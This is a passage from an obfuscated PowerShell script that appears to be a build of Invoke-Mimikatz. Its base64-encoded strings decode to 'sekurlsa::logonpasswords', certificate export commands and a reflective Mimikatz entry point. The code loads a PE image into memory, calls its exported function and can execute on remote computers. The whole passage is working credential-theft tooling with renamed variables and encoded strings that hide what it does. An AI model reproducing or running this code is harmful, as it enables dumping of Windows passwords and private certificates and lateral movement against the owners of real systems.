			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
        try
        {
            ${_/==\__/==\__/==\} = gwmi -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if (${_/==\__/==\__/==\} -is [array])
        {
            ${__/==\_/=\/====\_} = ${_/==\__/==\__/==\}[0]
        } else {
            ${__/==\_/=\/====\_} = ${_/==\__/==\__/==\}
        }
        if ( ( ${__/==\_/=\/====\_}.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUAOgAgAA=='))) + ${__/==\_/=\/====\_}.AddressWidth + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABQAHIAbwBjAGUAcwBzADoAIAA='))) + ([System.IntPtr]::Size * 8))
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAGEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACAAKAAzADIAYgBpAHQALwA2ADQAYgBpAHQAKQAgAGQAbwBlAHMAbgAnAHQAIABtAGEAdABjAGgAIABPAFMAIABhAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAuACAANgA0AGIAaQB0ACAAUABTACAAbQB1AHMAdAAgAGIAZQAgAHUAcwBlAGQAIABvAG4AIABhACAANgA0AGIAaQB0ACAATwBTAC4A'))) -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]${___/==\_/\___/\/=\} = [Byte[]][Convert]::FromBase64String(${_/===\__/=\/==\/\})
        }
        else
        {
            [Byte[]]${___/==\_/\___/\/=\} = [Byte[]][Convert]::FromBase64String(${___/=\____/=\/===})
        }
        ${___/==\_/\___/\/=\}[0] = 0
        ${___/==\_/\___/\/=\}[1] = 0
		${_/====\_/\/======\} = [IntPtr]::Zero
		if (${__/=\_/\___/\_/\/=} -eq [IntPtr]::Zero)
		{
			${/==\__/=\/\__/==\} = _/=\_/\/==\/===\/= -___/==\_/\___/\/=\ ${___/==\_/\___/\/=\} -__/\/\/=\_/\______ ${__/\/\/=\_/\______}
		}
		else
		{
			${/==\__/=\/\__/==\} = _/=\_/\/==\/===\/= -___/==\_/\___/\/=\ ${___/==\_/\___/\/=\} -__/\/\/=\_/\______ ${__/\/\/=\_/\______} -__/=\_/\___/\_/\/= ${__/=\_/\___/\_/\/=}
		}
		if (${/==\__/=\/\__/==\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${_/====\_/\/======\} = ${/==\__/=\/\__/==\}[0]
		${/==\_/\/=\__/==\_} = ${/==\__/=\/\__/==\}[1] 
		${_/=\/====\/\/==\_/} = _/=\____/=\/\_/\__ -_/====\_/\/======\ ${_/====\_/\/======\} -_____/=\_____/\__/ ${_____/=\_____/\__/} -_____/\__/\/\/\/\/ ${_____/\__/\/\/\/\/}
		if ((${_/=\/====\/\/==\_/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/=\_/\___/\_/\/=} -eq [IntPtr]::Zero))
		{
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${/=\/\_/\/=\/\_/\/} = __/\/=\/\_______/\ -_/====\_/\/======\ ${_/====\_/\/======\} -______/\__/=\/\_/\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbABfAHIAZQBmAGwAZQBjAHQAaQB2AGUAXwBtAGkAbQBpAGsAYQB0AHoA')))
				    if (${/=\/\_/\/=\/\_/\/} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${/=\/===\/\__/=\/\} = _/==\/====\_/=\_/\ @([IntPtr]) ([IntPtr])
				    ${_/=\_/\/=\_/=\_/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\/\_/\/=\/\_/\/}, ${/=\/===\/\__/=\/\})
                    ${_/\/\_/=\/\/\/===} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${__/\/\/=\_/\______})
				    [IntPtr]${/=\_/=\/=\/\/\/\/} = ${_/=\_/\/=\_/=\_/=}.Invoke(${_/\/\_/=\/\/\/===})
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/\/\_/=\/\/\/===})
				    if (${/=\_/=\/=\/\/\/\/} -eq [IntPtr]::Zero)
				    {
				    	Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAG8AdQB0AHAAdQB0ACwAIABPAHUAdABwAHUAdAAgAFAAdAByACAAaQBzACAATgBVAEwATAA=')))
				    }
				    else
				    {
				        ${_/==\/\_/\/====\_} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/=\_/=\/=\/\/\/\/})
				        echo ${_/==\/\_/\/====\_}
				        ${_/=\/\/\/\____/\/=}.LocalFree.Invoke(${/=\_/=\/=\/\/\/\/});
				    }
		}
		elseif ((${_/=\/====\/\/==\_/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/=\_/\___/\_/\/=} -ne [IntPtr]::Zero))
		{
			${/=\/=\/=\__/===\_} = __/\/=\/\_______/\ -_/====\_/\/======\ ${_/====\_/\/======\} -______/\__/=\/\_/\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${/=\/=\/=\__/===\_} -eq $null) -or (${/=\/=\/=\__/===\_} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${/=\/=\/=\__/===\_} = __/=\/=\__/\/===== ${/=\/=\/=\__/===\_} ${_/====\_/\/======\}
			${/=\/=\/=\__/===\_} = _/===\/==\/======\ ${/=\/=\/=\__/===\_} ${/==\_/\/=\__/==\_}
			${_/\____/=\__/\/\_} = _/==\/==\__/\_____ -__/=\/\/=\__/\/==\ ${__/=\_/\___/\_/\/=} -__/\/==\_/\/==\/\/ ${/=\/=\/=\__/===\_} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=}
		}
		if (${__/=\_/\___/\_/\/=} -eq [IntPtr]::Zero)
		{
			__/=\_/\/\__/===\/ -_/====\_/\/======\ ${_/====\_/\/======\}
		}
		else
		{
			${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.VirtualFree.Invoke(${_/====\_/\/======\}, [UInt64]0, ${_____/\__/\/\/\/\/}.MEM_RELEASE)
			if (${______/\/\_/=\_/\} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	___/\/====\/\/====
}
Function ___/\/====\/\/====
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAFAAcgBvAGMAZQBzAHMASQBEADoAIAAkAFAASQBEAA==')))
	if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAHIAZQBkAHMA'))))
	{
		${__/\/\/=\_/\______} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIABlAHgAaQB0AA==')))
	}
    elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAGUAcgB0AHMA'))))
    {
        ${__/\/\/=\_/\______} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAHkAcAB0AG8AOgA6AGMAbgBnACAAYwByAHkAcAB0AG8AOgA6AGMAYQBwAGkAIAAiAGMAcgB5AHAAdABvADoAOgBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgAC8AZQB4AHAAbwByAHQAIgAgACIAYwByAHkAcAB0AG8AOgA6AGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAALwBlAHgAcABvAHIAdAAgAC8AcwB5AHMAdABlAG0AcwB0AG8AcgBlADoAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAiACAAZQB4AGkAdAA=')))
    }
    else
    {
        ${__/\/\/=\_/\______} = ${_/=\/\/===\_______}
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
	if (${_/=\/\_____/\/==\_} -eq $null -or ${_/=\/\_____/\/==\_} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${__/=\/=\_____/==\} -ArgumentList @(${_/===\__/=\/==\/\}, ${___/=\____/=\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${__/\/\/=\_/\______})
	}
	else
	{
		icm -ScriptBlock ${__/=\/=\_____/==\} -ArgumentList @(${_/===\__/=\/==\/\}, ${___/=\____/=\/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${__/\/\/=\_/\______}) -ComputerName ${_/=\/\_____/\/==\_}
	}
}
___/\/====\/\/====
}